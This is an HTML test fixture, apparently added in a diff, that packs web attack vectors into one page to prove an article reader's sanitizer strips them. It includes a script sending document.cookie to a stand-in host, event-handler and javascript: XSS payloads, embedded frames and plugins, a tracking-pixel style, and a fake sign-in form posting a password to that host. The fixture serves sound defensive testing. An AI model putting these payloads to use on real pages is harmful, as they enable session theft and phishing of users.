@@ -1,0 +1,91 @@
+<!doctype html>
+<!--
+  Everything a page could try to get executed inside Norte, in one page, so the
+  sanitizer is proved against an attempt rather than against an absence.
+
+  The prose exists because an extractor discards a page with too little text,
+  and a fixture that extracted to nothing would pass the "no script survived"
+  assertion for the wrong reason entirely.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Everything This Page Would Like To Run</title>
+<meta property="og:title" content="Everything This Page Would Like To Run">
+<meta property="og:site_name" content="Hostile Fixtures">
+<meta name="author" content="Fixture Author">
+<meta property="article:published_time" content="2026-01-15T12:00:00Z">
+<meta property="og:image" content="https://hostile.example/cover.png">
+<script>window.__norteHeadScript = true;</script>
+</head>
+<body>
+<article>
+<h1>Everything This Page Would Like To Run</h1>
+
+<p>Stored content is sanitized once, on the way into the database, and every
+consumer afterwards reads it without a sanitizer of its own. That is a good
+arrangement and it is also a single point of failure, so the thing it protects
+against belongs in a fixture that actually attempts it rather than in a comment
+asserting that it would be caught.</p>
+
+<script>
+  document.body.innerHTML = "<p>the body was replaced</p>";
+  fetch("https://hostile.example/collect?cookie=" + document.cookie);
+</script>
+
+<p onclick="alert('a click handler survived sanitization')">A paragraph whose
+click handler is an attempt to run code the moment the reader touches the text.
+The paragraph itself is ordinary prose and should be kept; only the handler has
+to go, which is what makes this harder than dropping the element.</p>
+
+<p>An image whose error handler is the payload, because an address that cannot
+load is the most reliable way to be called:
+<img src="https://hostile.example/missing.png" onerror="alert('onerror ran')" alt="a broken image"></p>
+
+<p><a href="javascript:alert('a javascript href survived')">A link whose target
+is a script</a> rather than a page. The text is worth keeping and the target is
+not, so the attribute goes and the sentence stays readable.</p>
+
+<p>A frame pointing somewhere else, which in a reader would be another origin's
+page rendered inside this one:</p>
+<iframe src="https://hostile.example/frame.html" width="600" height="400">
+  <p>the iframe fallback text</p>
+</iframe>
+
+<p>Two older ways of asking for a plugin, both of which still parse:</p>
+<object data="https://hostile.example/applet.swf" type="application/x-shockwave-flash">
+  <param name="movie" value="https://hostile.example/applet.swf">
+  <p>the object fallback text</p>
+</object>
+<embed src="https://hostile.example/applet.swf" type="application/x-shockwave-flash">
+
+<p>A style attribute carrying a url(), which is a request to a third party made
+by the act of rendering the article, and a position that would lift an element
+out of the page and over whatever is behind it:</p>
+<p style="background-image: url('https://hostile.example/pixel.png'); position: fixed; top: 0; color: #444">
+Text under a style attribute that asks for two things it should not get and one,
+a colour, that it may keep.</p>
+
+<p>Form controls, because a page that can render a password field inside a
+trusted reader can ask for a password that looks like it belongs there:</p>
+<form action="https://hostile.example/collect" method="post">
+  <input type="password" name="password">
+  <button type="submit">Sign in to continue reading</button>
+</form>
+
+<h2>Why the prose matters</h2>
+
+<p>None of the above is unusual on its own; a real page carries analytics, an
+embedded video and a newsletter form without meaning anyone harm. The sanitizer
+cannot tell intent apart from accident and should not try, so it keeps the small
+set of elements an article is made of and drops everything else, including the
+things that were only ever decoration.</p>
+
+<p>The cost is that a legitimately embedded video does not survive either. That
+is the right trade for a reader whose whole job is to show someone else's text,
+and the snapshot is kept precisely so the original page is still there when the
+embedded thing was the point.</p>
+</article>
+<script src="https://hostile.example/analytics.js"></script>
+</body>
+</html>
